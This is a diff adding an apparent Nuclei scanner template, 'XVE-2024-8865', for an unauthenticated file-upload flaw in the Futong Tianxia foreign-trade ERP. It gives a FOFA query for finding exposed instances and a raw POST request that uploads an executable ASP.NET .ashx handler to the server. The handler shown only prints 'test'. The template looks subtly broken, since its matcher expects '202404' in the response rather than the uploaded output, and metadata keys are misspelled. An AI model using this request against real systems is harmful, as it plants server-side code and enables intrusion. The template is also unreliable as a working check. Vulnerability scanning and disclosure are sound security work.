@@ -1,0 +1,39 @@
+id: XVE-2024-8865
+
+info:
+  name: XVE-2024-8865
+  author: lengmo
+  severity: high
+  description: XVE-2024-8865
+  tags: fileupload
+  metadata:
+    fofa-qeury: title="用户登录_富通天下外贸ERP"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+ 
+        <% @ webhandler language="C#" class="AverageHandler" %>
+        using System;
+        using System.Web;
+        public class AverageHandler : IHttpHandler
+        {
+        public bool IsReusable
+        { get { return true; } }
+        public void ProcessRequest(HttpContext ctx)
+        {
+        ctx.Response.Write("test");
+        }
+        }
+
+    matchers-condition: and      
+    matchers:     
+      - type: dsl
+        dsl:
+          - 'status_code ==200 && contains(body, "202404") && contains(header, "text/html")'
